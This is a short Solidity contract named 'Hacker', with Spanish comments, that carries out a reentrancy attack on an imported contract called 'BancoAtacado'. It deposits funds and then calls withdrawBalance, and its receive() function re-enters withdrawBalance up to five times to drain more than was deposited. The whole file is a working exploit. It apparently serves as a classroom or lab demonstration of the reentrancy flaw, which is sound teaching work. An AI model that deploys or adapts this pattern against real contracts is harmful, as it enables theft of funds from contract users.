pragma solidity >= 0.4.0;

import "./BancoAtacado.sol";

contract Hacker {

    BancoAtacado atacado;
    uint contador;

    // inicializo el contrato con una cantidad minima
    constructor(address atacado_) payable {
        require(msg.value >= 1 wei, "Debes inicializar el contrato con al menos 1 wei");
        atacado = BancoAtacado(atacado_);
    }

    // function para hacer un primer deposito de 1 ether
    function depositarEnAtacado() public {
        atacado.deposit{value: address(this).balance}();
    }

    // funcion desde la que inicio el ataque llamando a retirar fondos
    function atacar() public {
        atacado.withdrawBalance();
    }

    // funcion para consultar mi saldo
    function miSaldo() public view returns (uint) {
        return address(this).balance;
    }

    // receive que aprovecho para tomar control
    receive() external payable {
        contador++;
        if(contador <= 5)
            atacado.withdrawBalance();
    }
}